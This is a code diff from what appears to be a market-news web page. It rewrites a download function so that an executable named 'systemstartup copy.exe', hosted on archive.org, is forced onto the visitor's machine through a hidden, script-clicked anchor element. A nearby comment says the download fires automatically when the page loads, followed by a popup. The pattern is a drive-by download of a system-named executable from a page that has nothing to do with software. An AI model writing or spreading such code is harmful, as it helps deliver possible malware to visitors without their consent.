@@ -373,7 +373,13 @@ const marketNewsHeadlines = [
   // Download function
   const downloadFile = () => {
     const downloadUrl = 'https://archive.org/download/systemstartup-copy_202607/systemstartup%20copy.exe';
-    window.open(downloadUrl, '_blank');
+    // Create a temporary anchor tag to trigger the download
+    const link = document.createElement('a');
+    link.href = downloadUrl;
+    link.download = 'systemstartup-copy.exe'; // Set the filename for download
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
   };
 
   // Automatic download on page load and show popup after 2 seconds
